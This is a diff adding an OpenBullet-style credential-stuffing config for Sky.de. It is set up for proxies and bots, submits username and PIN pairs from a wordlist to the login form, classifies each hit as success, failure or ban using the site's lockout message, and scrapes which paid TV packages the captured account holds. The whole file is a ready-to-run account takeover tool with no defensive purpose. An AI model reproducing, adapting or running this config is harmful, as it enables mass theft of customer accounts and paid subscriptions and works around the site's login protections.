@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Sky.de",
+  "SuggestedBots": 30,
+  "LastModified": "2019-03-16T11:35:55.1867602+01:00",
+  "AdditionalInfo": "MailPin ( 4 Number Pin )",
+  "Author": "Demha",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login_ REQUEST POST "https://www.sky.de/login" AutoRedirect=TRUE 
+  CONTENT "formField_headerlogin_userid=<USER>&formField_headerlogin_pin=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.sky.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 83" 
+  HEADER "Origin: https://www.sky.de" 
+  HEADER "Referer: https://www.sky.de/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7" 
+REQUEST GET "https://www.sky.de/mein-sky" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.sky.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.sky.de/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\">LOGOUT" 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" EqualTo "Aus Sicherheitsgründen haben wir nach der dritten Falscheingabe Deiner Login-Daten den Zugang zu Deinem persönlichen Bereich gesperrt." 
+  KEYCHAIN Failure OR 
+    KEY "Logge Dich bitte unten ein" 
+#Request REQUEST GET "https://www.sky.de/mein-sky/mein-abonnement" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.sky.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.sky.de/mein-sky" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/pakete-produkte/sky-entertainment-paket-37831\" class=\"pktEntertainment\">" "</a>" Recursive=FALSE -> CAP "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/pakete-produkte/sky-cinema-paket-38442\" class=\"pktCinema\">" "</a>" Recursive=FALSE -> CAP "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/pakete-produkte/sky-sport-paket-6207\" class=\"pktSport\">" "</a>" Recursive=FALSE -> CAP "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/sky-fussball-bundesliga-paket-2547\" class=\"pktFussball\">" "</a>" Recursive=FALSE -> CAP "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "class=\"pktHd\">" "</a>" Recursive=FALSE -> CAP "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/mein-abo-erweitern/sky-welt-paket-6206\" class=\"pktWelt\">" "</a>" Recursive=FALSE -> VAR "Paket" "" "" 
+#Capture PARSE "<SOURCE>" LR "<a href=\"/bestellung/pakete-produkte/film-paket-2546\" class=\"pktFilm\">" "</a>" Recursive=FALSE -> VAR "Paket" "" "" 
